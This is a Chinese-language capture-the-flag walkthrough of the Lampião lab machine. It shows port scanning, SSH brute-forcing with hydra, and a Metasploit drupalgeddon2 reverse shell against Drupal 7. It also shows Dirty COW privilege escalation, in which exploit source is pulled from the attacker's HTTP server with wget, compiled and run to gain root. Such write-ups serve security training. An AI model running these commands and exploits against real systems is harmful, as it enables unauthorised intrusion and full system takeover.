## 总结

getwebshell → 指纹收集 → 发现存在`RCE`的漏洞 →`MSF`利用 →`getwebshell`

提 权 思 路： 内网信息收集 → 内核以及发行版较低 → 脏牛提权

## 准备工作

  * 启动VPN  
获取攻击机IP >`192.168.45.211`

![](https://image.3001.net/images/20230809/1691546239_64d2f27f6230d15c03061.png!small)

  * 启动靶机  
获取目标机器IP >`192.168.209.48`

![](https://image.3001.net/images/20230809/1691546240_64d2f28087573fed96d7f.png!small)

## 信息收集-端口扫描

### 目标开放端口收集

  * Nmap开放端口扫描2次

    
    
    sudo nmap --min-rate 10000 -p- 192.168.209.48
    
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    1898/tcp open  cymtec-port
    

![](https://image.3001.net/images/20230809/1691546241_64d2f2818424f4ef6f96c.png!small)

`开放的端口 > 22,80,1989`

### 目标端口对应服务探测

    
    
    # tcp探测
    sudo nmap -sT -sV -O -sC -p22,80,1898 192.168.209.48
    
    PORT     STATE  SERVICE    VERSION     
    22/tcp   open   ssh        OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
    80/tcp   open   http?            
    1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))   
    

初步看`1898`内容比较精彩

![](https://image.3001.net/images/20230809/1691546242_64d2f282797cf2267daa3.png!small)

## 信息收集-端口测试

### 22-SSH端口的信息收集

#### 22-SSH端口版本信息与MSF利用

通过`Nmap`探测获得SSH的版本信息，可以尝试利用  
探测版本为`OpenSSH 6.6.1p1 Ubuntu`

    
    
    # 搜索对应脚本
    msf6 > searchsploit OpenSSH 6.6.1p1
    

发现搜索到可利用的和用户枚举有关（待定）

![](https://image.3001.net/images/20230809/1691546243_64d2f28390751533cce5c.png!small)

#### 22-SSH协议支持的登录方式

通过`Nmap`探测获得SSH的版本信息，在获取到某个用户名之后尝试

    
    
    ssh root@192.168.209.48 -v
    

显示`publickey`、`password`就是支持密钥以及密码登录

![](https://image.3001.net/images/20230809/1691546244_64d2f28485346a345d53b.png!small)

#### 22-SSH手动登录尝试(无)

因为支持密码登录，尝试`root`账户的密码弱密码尝试

    
    
    ssh root@192.168.209.48 -p 22
    # 密码尝试
    password > root
    

弱密码尝试失败

![](https://image.3001.net/images/20230809/1691546246_64d2f2861152d60990824.png!small)

#### 22-SSH弱口令爆破(静静等待)

因为支持密码登录，尝试`root`账户的密码爆破，利用工具`hydra`，线程-t为6

    
    
    hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 -vV 192.168.209.48 ssh -s 22
    

挂着工具进行爆破，我们尝试后续信息收集

![](https://image.3001.net/images/20230809/1691546246_64d2f286cc90e731dab98.png!small)

### 80-HTTP端口的信息收集

访问`http://192.168.209.48:80`不是`CMS`我们直接从`HTML`隐藏信息收集开始

![](https://image.3001.net/images/20230809/1691546247_64d2f287d23be8999d7bf.png!small)

#### 信息收集-HTML隐藏信息查看

    
    
    # 包括文章中是否写明一些敏感信息
    ┌──(root㉿Kali)-[/home/bachang/Lampiao]
    └─# curl http://192.168.209.48:80
    curl: (1) Received HTTP/0.9 when not allowed
    

协议有点老，是`0.9`不支持`curl`

![](https://image.3001.net/images/20230809/1691546248_64d2f288dae9d875b482c.png!small)

利用`f12`查看，无隐藏内容

![](https://image.3001.net/images/20230809/1691546249_64d2f2899d0b3a560de4d.png!small)

#### 信息收集-目录扫描

##### 信息收集-目录扫描初步

    
    
    dirsearch -u http://192.168.209.48:80 -x 302,403
    

这个有点烧脑 研究了一下`0.9`

![](https://image.3001.net/images/20230809/1691546251_64d2f28b25e8f1546c4b8.png!small)

    
    
    HTTP/0.9是一种非常简化的协议，不支持请求头部和其他复杂特性。如果你的请求格式与HTTP/0.9不兼容，服务器可能会给出一个错误响应。
    

故先放过80端口

### 1898-HTTP端口的信息收集

访问`http://192.168.209.48:1898`从`title`图标上来看是水滴的标志

![](https://image.3001.net/images/20230809/1691546252_64d2f28c13786305ed7ce.png!small)

#### 信息收集-网站指纹

    
    
    ┌──(root㉿Kali)-[/home/bachang/Lampiao]
    └─# whatweb http://192.168.209.48:1898  
    
    http://192.168.209.48:1898 [200 OK] Apache[2.4.7], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[192.168.209.48], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.5.9-1ubuntu4.24], PasswordField[pass], Script[text/javascript], Title[Lampião], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.5.9-1ubuntu4.24]
    
    

查询到了`CMS`是`Drupal 7`

![](https://image.3001.net/images/20230809/1691546253_64d2f28d33e62b66e1c6c.png!small)

## 漏洞利用-getwebshell

现在得到的信息是使用的`cms`是`Drupal 7`，尝试直接`msf`上线

### 漏洞利用-msf网站指纹

    
    
    # 搜索对应的漏洞是否存在
    msf6 > searchsploit Drupal 7
    

![](https://image.3001.net/images/20230809/1691546254_64d2f28e433b850c4fee5.png!small)

存在特别多的可利用点，呼出`msf`控制台

    
    
    search Drupal 7
    

使用较新日期的1，日期以及`Rank`查看都非常不错

![](https://image.3001.net/images/20230809/1691546256_64d2f29022fb8a05bb65c.png!small)

#### 漏洞利用尝试1

    
    
    use 1
    show payloads
    set payload 3
    

先选用`payloads`，使用`反弹shell`的

![](https://image.3001.net/images/20230809/1691546257_64d2f2918e3e3a49af373.png!small)

    
    
    # 展示设置
    msf6 exploit(unix/webapp/drupal_drupalgeddon2) > show options
    # msf基础设置
    msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set lhost 192.168.45.211
    lhost => 192.168.45.211
    msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set rhosts 192.168.209.48
    rhosts => 192.168.209.48
    msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set rport 1898
    rport => 1898
    

![](https://image.3001.net/images/20230809/1691546258_64d2f292b497bcebd53a4.png!small)

发现运行失败

![](https://image.3001.net/images/20230809/1691546259_64d2f293e808456e17d4f.png!small)

#### 漏洞利用尝试2

重新思考原因，尝试换一个`payload`  
`反弹shell`有3、17、18、19 选择较全面并且稳定的`uuid`

![](https://image.3001.net/images/20230809/1691546260_64d2f294cc1fa14b2c18e.png!small)  
`run`成功`反弹shell`

![](https://image.3001.net/images/20230809/1691546262_64d2f29604719dee01b1f.png!small)

## 内网遨游-getshell

### 交互shell

由于获取的shell交互不友好，利用python获得新的交互shell

    
    
    # 如果是msf的要先shell
    shell
    # 利用python获取交互shell -> python失败使用python3
    python -c "import pty;pty.spawn('/bin/bash')";
    

![](https://image.3001.net/images/20230809/1691546262_64d2f296dea544d9acd62.png!small)

### FLAG1获取

    
    
    www-data<span class="label label-primary">@lampiao</span>:/var/www/html$ find / -name local.txt 2>/dev/null
    /home/tiago/local.txt
    www-data<span class="label label-primary">@lampiao</span>:/var/www/html$ cat /home/tiago/local.txt
    6402b28c169c5ce74af22da91f95b2d7
    

![](https://image.3001.net/images/20230809/1691546263_64d2f297ea8674094d33e.png!small)

### 信息收集-内网基础信息收集

提权的本质在于`枚举`，在获取shell之后我们要进行内网信息的收集，都是为了`提权`做准备

#### 检测Linux操作系统的发行版本

较老的`Ubuntu`以及Linux系统可以`overlayfs`提权

    
    
    # 确定发行版本
    www-data@lampiao:/var/www/html$ lsb_release -a
    No LSB modules are available.
    Distributor ID: Ubuntu
    Description:    Ubuntu 14.04.5 LTS
    Release:        14.04
    Codename:       trusty
    

发行版本为`Ubuntu 14.04.5`，14的版本有机会`overlayfs`提权

![](https://image.3001.net/images/20230809/1691546264_64d2f298c20eb95b2298b.png!small)

#### 检测Linux操作系统的内核版本

较低的内核版本可以进行`脏牛`提权

    
    
    www-data@lampiao:/var/www/html$ uname -a
    Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 athlon i686 GNU/Linux
    

内核版本为`4.4.0`，等会搜搜，因为发行版老有机会脏牛提权。

![](https://image.3001.net/images/20230809/1691546265_64d2f29989e42e32caf19.png!small)

#### 检测当前用户的权限

    
    
    www-data@lampiao:/var/www/html$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    

![](https://image.3001.net/images/20230809/1691546266_64d2f29a3e69ed35d1d45.png!small)

#### 列举出所有的sudo文件

查找具有`sudo`权限，且不需要密码的可提权文件  
如果发现`sudo -l`有东西的话 访问`https://gtfobins.github.io`寻找

    
    
    # 利用sudo -l寻找
    sudo -l
    

发现需要密码

![](https://image.3001.net/images/20230809/1691546266_64d2f29ae81e0e98b2654.png!small)

### 权限提升

#### 内核提权尝试1

若存在以下情况进行脏牛提权

系统| 版本  
---|---  
Centos7/RHEL7| 3.10 .0-327.36.3.e17  
Cetnos6/RHEL6| 4.4.0-45.66  
Ubuntu 16.10| 2.6.32-642 .6.2.e16  
Ubuntu 16.04| 4.8.0-26.28  
Ubuntu 14.04| 3.13.0-100.147  
Debian 8| 3.16.36-1+deb8u2  
Debian 7| 3.2.82-1  
      
    
    searchsploit Ubuntu 14.04 4.4.0
    

查询了内容发现有3个，先选用第一个进行尝试(条件竞争)

![](https://image.3001.net/images/20230809/1691546267_64d2f29bbf1f05452fcdf.png!small)

    
    
    cat /usr/share/exploitdb/exploits/linux_x86-64/local/40871.c
    

查询到编译方法

![](https://image.3001.net/images/20230809/1691546268_64d2f29cd9309f5d89041.png!small)

##### python3开启http服务

    
    
    # 利用python开启http服务，方便目标机器上下载文件
    sudo python3 -m http.server 90
    
    
    
    # 目标机器到tmp目录下下载(有下载权限)
    cd /tmp
    # 下载
    wget http://192.168.45.211:90/40871.c
    # 给权限
    chmod +x 40871.c
    # 编译
    gcc 40871.c -o root_root -lpthread
    # 给权限
    chmod +x root_root
    # 运行
    ./root_root
    

条件竞争不是很会用

![](https://image.3001.net/images/20230809/1691546270_64d2f29e0c58a25d22044.png!small)

#### 内核提权尝试2(失败)

其实可以直接搜索脏牛提权漏洞

    
    
    searchsploit dirty
    

![](https://image.3001.net/images/20230809/1691546270_64d2f29eefd3752cd20f8.png!small)

    
    
    # 查看信息
    cat /usr/share/exploitdb/exploits/linux/local/40839.c
    # 拷贝
    cp /usr/share/exploitdb/exploits/linux/local/40839.c .
    

![](https://image.3001.net/images/20230809/1691546272_64d2f2a02dc8e7980504c.png!small)

    
    
    # 利用python开启http服务，方便目标机器上下载文件
    sudo python3 -m http.server 90
    
    
    
    # 目标机器到tmp目录下下载(有下载权限)
    cd /tmp
    # 下载
    wget http://192.168.45.191:90/40839.c
    # 给权限
    chmod +x 40839.c
    # 编译
    gcc -pthread 40839.c -o root_1 -lcrypt
    # 给权限
    chmod +x root_1
    # 运行
    ./root_1
    

![](https://image.3001.net/images/20230809/1691546273_64d2f2a16bfa3c57bc0ab.png!small)  
但是随后发现服务器被玩崩了

![](https://image.3001.net/images/20230809/1691546275_64d2f2a32825d0178df7d.png!small)

#### 内核提权尝试3

    
    
    searchsploit dirty
    

![](https://image.3001.net/images/20230809/1691546276_64d2f2a4a3a9f9fa58f94.png!small)

    
    
    # 查看信息
    cat /usr/share/exploitdb/exploits/linux/local/40847.cpp
    # 拷贝
    cp /usr/share/exploitdb/exploits/linux/local/40847.cpp .
    

找到了编译和运行方法

![](https://image.3001.net/images/20230809/1691546277_64d2f2a5b7ea9f395e007.png!small)

    
    
    # 利用python开启http服务，方便目标机器上下载文件
    sudo python3 -m http.server 90
    
    
    
    # 目标机器到tmp目录下下载(有下载权限)
    cd /tmp
    # 下载
    wget http://192.168.45.191:90/40847.cpp
    # 给权限
    chmod +x 40847.cpp
    # 编译
    g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
    # 给权限
    chmod +x dcow
    # 运行
    ./dcow -s
    

成功提权

![](https://image.3001.net/images/20230809/1691546278_64d2f2a6e6d2026699ad4.png!small)

### FLAG2获取

    
    
    root<span class="label label-primary">@lampiao</span>:~# cat /root/proof.txt
    7d9526fb2735f30765a41decd06353b0
    

完结撒花~

![](https://image.3001.net/images/20230809/1691546280_64d2f2a812933903196b4.png!small)

## 反思

优先探测是否可以使用内核，内核提权省时省力。  
在内核提权中优先使用`*.cpp`的会比较好

